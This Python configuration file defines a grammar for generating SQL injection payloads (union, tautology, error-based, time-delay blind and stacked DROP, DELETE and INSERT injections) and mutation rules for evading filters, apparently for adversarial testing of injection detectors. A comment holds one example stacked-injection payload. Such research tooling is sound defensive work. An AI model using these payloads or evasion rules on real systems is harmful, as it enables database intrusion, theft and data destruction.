import sqlparse

CFG_CONF = {
    # 1=1, 1 = 1, 2.6 = 2.6, -3.7 = -3.7, 1 = 1.0 '1'='1' 'foo'='foo'
    'T_Tautology': ['F_tautology_number|F_tautology_string|F_tautology_complex|True_Query'],
    # <TautologyRewriting>::=<F_tautology_number|F_tautology_string|F_tautology_complex|True_Query>

    'S1_and': ['F_And space True_Query space F_And space'],
    # <AndLogicalInvariant>::=F_And,<space>,<True_Query>,<space>,F_And,<space>

    'S2_and': ['F_And'],
    # <AndSubstitution>::=F_And

    'S1_or': ['F_Or space False_Query space F_Or space'],
    # <OrLogicalInvariant>::=F_Or,<space>,False_Query,<space>,F_Or,<space>

    'S2_or': ['F_Or'],
    # <OrSubstitution>::=<F_Or>

    'S_not': ['F_Not'],

    '=': ['space opLike space'],
    # <EqualSubstitution>::=<space>,opLike,<space>

    'space': ['F_Space|space F_Space'],
    # <space>::=F_Space|<space>,F_Space

    'T1_Whitespace': ['F_Whitespace_Alternatives'],
    # <SpaceSubstitutionOther> ::=F_Whitespace_Alternatives

    'T2_Whitespace': ['Left_Inline_Comment Inline_Comment Right_Inline_Comment'],
    # <SpaceSubstitutionComment> ::=<Left_Inline_Comment>,<Inline_Comment>,<Right_Inline_Comment>

    'Left_Inline_Comment': ['opSlash Left_Inline_Comment_Asterisk'],
    # <Left_Inline_Comment>::=opSlash,<Left_Inline_Comment_Asterisk>
    'Left_Inline_Comment_Asterisk': ['Left_Inline_Comment_Asterisk opAsterisk|opAsterisk'],
    # <Left_Inline_Comment_Asterisk>::=<Left_Inline_Comment_Asterisk>,opAsterisk|opAsterisk
    'Right_Inline_Comment': ['Right_Inline_Comment_Asterisk opSlash'],
    # <Right_Inline_Comment>::=<Left_Inline_Comment_Asterisk>,opSlash
    'Right_Inline_Comment_Asterisk': ['Right_Inline_Comment_Asterisk opAsterisk|opAsterisk'],
    # <Right_Inline_Comment_Asterisk>::=<Right_Inline_Comment_Asterisk>,opAsterisk|opAsterisk
    'Inline_Comment': ['F_Inline_Comment_Random_Word|F_Inline_Comment_Benign|F_Inline_Comment_Random_Sentence'],
    # <Inline_Comment>::=F_Inline_Comment_Random_Word|F_Inline_Comment_Benign|F_Inline_Comment_Random_Sentence

    'T_MultilineComment': ['Left_Inline_Comment Inline_Comment Right_Inline_Comment',
                           'Left_Inline_Comment space Right_Inline_Comment'],
    # <MultilineCommentRewriting>::<Left_Inline_Comment>,<Inline_Comment>,<Right_Inline_Comment>|<Left_Inline_Comment>,<space>,<Right_Inline_Comment>
    'T_SingleComment': ['A_SingleComment_Rewrite'],
    # <SingleCommentRewriting>::A_SingleComment_Rewrite
    '#': ['A_SingleComment_Rewrite'],
    # <HashCommentRewriting>::A_SingleComment_Rewrite
    # where重写
    'S_where': ['opWhere space False_Query space F_Or|opWhere space True_Query space F_And'],
    # <WhereRewriting>::=opWhere,<space>,<False_Query>,<space>,F_Or|opWhere,<space>,<True_Query>,<space>,F_And
    'True_Query': ['F_True_Query|True_Query space F_And space F_True_Query'],
    # <True_Query>::=F_True_Query|<True_Query>,<space>,F_And,<space>,F_True_Query
    'False_Query': ['F_False_Query|False_Query space F_Or space F_False_Query'],
    # <False_Query>::=F_False_Query|<False_Query>,<space>,F_Or,<space>,F_False_Query

    'T_Number': ['A_Swap_Integer_Hex'],
    # <IntegerEncoding>::=A_Swap_Integer_Hex

    'T1_Keyword': ['A_Swap_Case'],
    # <KeywordCaseSwapping>::=A_Swap_Case

    'T2_Keyword': ['A_Inline_Comment'],
    # <KeyWordInlineComment>::=A_Inline_Comment

    'T_QuotationMark': ['A_QuotationMark_Swap_Hex'],
    # <QuotationEncoding>::=A_QuotationMark_Swap_Hex

    'Norm_Payload': [
        'RandomString',
        'RandomString space Norm_Payload'
    ],
    'RandomString': [
        'F_random_word|F_NotDigitPositiveZero|F_random_mysql_reserved_keywords'],

    'SQLInjection_Payload': [
        'NumericContext|QuoteContext|ParenthesesContext|PercentContext'
    ],

    'NumericContext': [
        'F_Digit space NonStackInjectionContext|F_Digit StackInjectionContext'
    ],

    'QuoteContext': [
        'F_Digit opQuote space NonStackInjectionContext cmt'
        '|F_Digit opSquote space NonStackInjectionContext space opOr space opSquote F_Digit'
        '|F_Digit opDquote space NonStackInjectionContext space opOr space opDquote F_Digit'
        '|F_Digit opQuote space NonStackInjectionContext StackInjectionContext cmt'
        '|F_Digit opQuote StackInjectionContext cmt'
        '|F_Digit opQuote space StackInjectionContext cmt'
    ],

    'ParenthesesContext': [
        'F_Digit opParC space NonStackInjectionContext cmt'
        '|F_Digit opParC space NonStackInjectionContext space opOr space opParO F_Digit'
        '|F_Digit opSquote opParC space NonStackInjectionContext space opOr space opParO opSquote F_Digit'
        '|F_Digit opDquote opParC space NonStackInjectionContext space opOr  space opParO opDquote F_Digit'
        '|F_Digit opParC space NonStackInjectionContext StackInjectionContext cmt'
        '|F_Digit opParC StackInjectionContext cmt'
        '|F_Digit opParC space NonStackInjectionContext StackInjectionContext cmt'
    ],

    'PercentContext': [
        'F_Digit opPercent opQuote parC space NonStackInjectionContext cmt'
        '|F_Digit opPercent opQuote parC space NonStackInjectionContext StackInjectionContext cmt'
        '|F_Digit opPercent opQuote parC StackInjectionContext cmt'
        '|F_Digit opPercent opQuote parC space NonStackInjectionContext StackInjectionContext cmt'
    ],

    'NonStackInjectionContext': [
        'UnionInjectionContext|TautologyInjectionContext|ErrorInjectionContext'
        '|BooleanBlindInjectionContext|TimeDelayBlindInjectionContext'
    ],

    'StackInjectionContext': [
        'opSem StackInjection|opSem StackInjection StackInjectionContext|opSem space StackInjection'
        '|opSem space StackInjection StackInjectionContext'
    ],

    'StackInjection': [
        'StackDropInjection|StackInsertInjection|StackUpdateInjection'
        '|StackDeleteInjection|StackCreateInjection|StackUnionInjection'
    ],

    # unionAttack
    'UnionInjectionContext': [
        'opOrder space opBy space F_NotDigitPositiveZero|opUnion space opSelect space selectCols'
        '|opUnion space unionPostfix opSelect space selectCols|opUnion space unionPostfix opSelect space F_Concat'
        '|opUnion space unionPostfix opParO opSelect space selectCols opParC'
    ],

    # unionPostfix
    'unionPostfix': [
        'opAll space|opDistinct space'
    ],

    # selectCols
    'selectCols': [
        'cols|cols opComma selectCols'
    ],

    # cols
    'cols': [
        'F_MysqlF|opZero|F_NotDigitPositiveZero'
    ],

    'TautologyInjectionContext': [
        'opOr space T_Tautology'
    ],

    'TimeDelayBlindInjectionContext': [
        'opAnd space F_Sleep|opAnd space F_Benchmark|opOr space F_Sleep|opOr space F_Benchmark'
    ],

    'ErrorInjectionContext': [
        'opOr space F_Error',
    ],

    'BooleanBlindInjectionContext': [
        'opOr space F_Compare|opOr space F_elt_compare'
    ],

    # ?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
    'StackInsertInjection': [
        'opInsert space opInto space F_InsertContent|opInsert space opInto space F_InsertOrUpdateContent'
    ],

    'StackUpdateInjection': [
        'opUpdate space F_UpdateContent|opUpdate space F_InsertOrUpdateContent'
    ],

    'StackDeleteInjection': [
        'opDelete space opFrom space F_DeleteContent'
    ],

    'StackDropInjection': [
        'opDrop space opTable space F_TableName'
    ],

    'StackCreateInjection': [
        'opCreate space opTable space F_TableName'
    ],

    'StackUnionInjection': [
        'opSelect space selectCols'
    ],

    # ) )) )))
    'parC': [
        'opParC|parC opParC'
    ],

    # ' "
    'opQuote': [
        'opSquote|opDquote'
    ],

    'cmt': [
        'F_Hashtag space|dcmt space|dcmt opAdd'
    ],

    'dcmt': ['--'],
    'opOrder': ['order'],
    'opBy': ['by'],
    'opUnion': ['union'],
    'opSelect': ['select'],
    'opDrop': ['drop'],
    'opCreate': ['create'],
    'opAll': ['all'],
    'opDistinct': ['distinct'],
    'opAnd': ['and'],
    'opTable': ['table'],
    'opOr': ['or|xor'],
    'opInsert': ['insert'],
    'opUpdate': ['update'],
    'opDelete': ['delete'],
    'opInto': ['into'],
    'opWhere': ['where'],
    'opFrom': ['from'],
    'opIf': ['if'],
    'opSquote': ["'"],
    'opDquote': ['"'],
    'opParC': [')'],
    'opParO': ['('],
    'opComma': [','],
    'opSem': [';'],
    'opPercent': ['%'],
    'opAdd': ['+'],
    'opZero': ['0'],
    'opSpace': [' '],
    'opHashtag': ['#'],
    'opLike': ['like'],
    'opSlash': ['/'],
    'opAsterisk': ['*']
}

CFG_CONF_ENTRY = {

    'E_Keyword_Case_Swap': ['T1_Keyword', CFG_CONF['T1_Keyword'], 1],

    'E_Whitespace_Substitution_Other': ['T1_Whitespace', CFG_CONF['T1_Whitespace'], 2],

    'E_MultilineComment_Rewrite': ['T_MultilineComment', CFG_CONF['T_MultilineComment'], 3],

    'E_SingleComment_Rewrite': ['T_SingleComment', CFG_CONF['T_SingleComment'], 4],

    'E_Number_Encode': ['T_Number', CFG_CONF['T_Number'], 5],

    'E_Equal': ['=', CFG_CONF['='], 6],

    'E_And_Logical_invariance': ['S1_and', CFG_CONF['S1_and'], 7],

    'E_Or_Logical_invariance': ['S1_or', CFG_CONF['S1_or'], 8],

    'E_Whitespace_Substitution_Comment': ['T2_Whitespace', CFG_CONF['T2_Whitespace'], 9],

    'E_And_Substitution': ['S2_and', CFG_CONF['S2_and'], 10],

    'E_Or_Substitution': ['S2_or', CFG_CONF['S2_or'], 11],

    'E_Keyword_Comment_Injection': ['T2_Keyword', CFG_CONF['T2_Keyword'], 12],

    'E_Where_Rewrite': ['S_where', CFG_CONF['S_where'], 13],

    'E_Tautology': ['T_Tautology', CFG_CONF['T_Tautology'], 14],

    'E_QuotationMark': ['T_QuotationMark', CFG_CONF['T_QuotationMark'], 15],
}

TOKEN_TYPE_DICT = {
    # [class, token]
    "Tautology": ["<class 'sqlparse.sql.Comparison'>", None],
    "Whitespace": ["<class 'sqlparse.sql.Token'>", ['Token.Text.Whitespace']],
    "Keyword": ["<class 'sqlparse.sql.Token'>", ['Token.Keyword', 'Token.Keyword.DML', 'Token.Keyword.DDL',
                                                 'Token.Keyword.CTE']],
    "Number": ["<class 'sqlparse.sql.Token'>", ['Token.Literal.Number.Integer']],
    # --+  #spacespace --space
    'SingleComment': ["<class 'sqlparse.sql.Token'>",
                      ['Token.Comment.Single', 'Token.Comment.Single.Hint']],
    # /****123123123*/
    'MultilineComment': ["<class 'sqlparse.sql.Token'>",
                         ['Token.Comment.Multiline', 'Token.Comment.Multiline.Hint']],
    # '',""
    'QuotationMark': ["<class 'sqlparse.sql.Token'>", ['Token.Literal.String.Single', 'Token.Literal.String.Symbol']]

}

LEAF_NODE_TYPE_DICT = [
    sqlparse.sql.Token,
    sqlparse.sql.Comparison
]
